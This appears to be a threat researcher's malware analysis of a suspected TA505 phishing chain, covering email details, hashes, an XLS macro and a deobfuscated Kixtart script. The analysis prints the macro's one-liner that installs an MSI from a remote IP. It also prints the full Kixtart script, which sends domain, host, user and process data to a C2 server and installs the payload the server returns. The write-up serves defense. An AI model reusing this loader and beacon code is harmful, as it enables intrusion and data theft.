# Summary
Suspected TA505 Phish
Attack flow
Phish -> HTML attachment /w link -> XLS /w macro -> MSI (Kixtart) -> MSI (Rebol) -> FlawedGrace

# Email
Sender: 	admin@commaxdiafon.com
Subject:  	Claim Processing 20210925
Received: 	from 196-60win.webimhosting.com (HELO webimhosting.com) ([217.195.196.60])

Contains an html attachment which contains a link to download a malicious XLS hxxps://cdn-8846-sharepoint-office.com/CL09302021_00137[.]xls 

# XLS (deaad3ea1c708cd99e41c4043169aa4d)
- Macro
    ```
    Function Auto_Open()
        Dim a As New ScriptControl
        a.Language = ActiveWorkbook.BuiltinDocumentProperties("Subject").Value
        a.AddCode (ActiveWorkbook.BuiltinDocumentProperties("Comments").Value)
    End Function
    ```
- Comments: eval('})"53.502.831.551//:ptth"(tcudorPllatsnI;2=leveLIU{))"rellatsnI.rellatsnIswodniW"(tcejbOXevitcA wen(htiw'.split('').reverse().join(''))
- Reversed: with(new ActiveXObject("WindowsInstaller.Installer")){UILevel=2;InstallProduct("hxxp://155.138.205.35")}

- Pulls down and executes MSI 

# MSI (84ec41afdc49c2ee8dff9ba07ba5c9a4)
- contains benign kixtart engine (named svchost.exe) and an encrypted and tokenized kixtart script (named svchost.bin)
	
# Kixtart Script (a176738655f7bd7270aa086db0f35451)
- Encrypted and tokenized 
- Developed a python script to decrypt and detokenize: https://github.com/jhumble/Kixtart-Detokenizer
- Full cleaned up kixtart script below
	
I wasn't able to coerce the C2 into giving me an additional payload, but other reporting indicates that it leads to another MSI containing a Rebol script, which downloads and executes FlawedGrace

# Detokenized Script
```
Function base64($string,$mode,$file)
	DIM $xml_object,$xml_doc,$stream_object,$strxml,$rc
	$xml_object =  createobject("MSXML2.DOMDocument.3.0") 
	if $mode
		$strxml = "<B64DECODE xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="bin.base64">" + $string + "</B64DECODE>"
		$rc = $xml_object.loadxml($strxml) 
		$base64 = $xml_object.selectsinglenode("B64DECODE") .nodetypedvalue
		if @errorexit (@error & )  endif 
		if $file
			$stream_object =  createobject("ADODB.Stream") 
			if @errorexit (@error & )  endif 
			$rc = $stream_object.open
			if @errorexit (@error & )  endif 
			$stream_object.type = 1
			$rc = $stream_object.write($base64) 
			$stream_object.position = 0
			$stream_object.type = 1
			$stream_object.position = 0
			$stream_object.savetofile($file,2) 
			exit (@error & ) 
		endif 
	else
		$stream_object =  createobject("ADODB.Stream") 
		if @errorexit (@error & )  endif 
		$rc = $stream_object.open
		if @errorexit (@error & )  endif 
		if  len($file)  and 0 =  exist($file) exit 2 endif 
		if $file
			$stream_object.type = 1
			$stream_object.loadfromfile($file) 
			if @errorexit (@error & )  endif 
		else
			$stream_object.type = 2
			$stream_object.charset = "iso-8859-1"
			$rc = $stream_object.writetext($string) 
			$stream_object.position = 0
			$stream_object.type = 1
			$stream_object.position = 0
		endif 
		$string = $stream_object.read
		$xml_doc = $xml_object.createelement("base64") 
		$xml_doc.datatype = "bin.base64"
		$xml_doc.nodetypedvalue = $string
		$base64 =  cstr($xml_doc.text) 
		$stream_object = ""
		$xml_doc = ""
		$xml_object = ""
	endif 
EndFunction

$wmicoll =  getobject("WinMgmts:root/cimv2") .execquery("Select * FROM Win32_Process") 

For each $wmiobj in $wmicoll
	$proccess = $proccess + "," + $wmiobj.name
Next

$http =  createobject("microsoft.xmlhttp") 
$http.open("GET","http://45.79.239.23/version.php?data=" + base64(@domain + ":" + @hostname + ":" + @userid + "|" + $proccess) ,Not 1) 
$http.send

if $http.responsebody <> 0
	$msi =  createobject("WindowsInstaller.Installer") 
	$msi.uilevel = 2
	$msi.installproduct($http.responsetext) 
endif```


